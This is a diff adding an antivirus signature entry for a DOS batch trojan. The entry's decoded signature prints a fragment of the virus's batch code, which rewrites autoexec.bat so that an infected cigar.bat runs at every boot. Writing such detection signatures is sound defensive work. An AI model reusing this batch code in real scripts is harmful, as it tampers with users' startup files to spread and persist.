@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36653
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off if no exist c:\cigar.bat goto cigar for %%i in (*.bat) do set cigar=%%i for %%o in (%bt%) do if "%cigar%"=="autoexec.bat" goto mod goto n :cigar echo @echo off >> c:\cigar.bat :mod rem - modul 1 -- attrib autoexec.bat -r copy autoexec.bat autoexec.olf echo @if exist cigar.bat call cigar.bat > autoexec.bat type autoexec.olf >> autoexec.bat del autoexec.olf :n
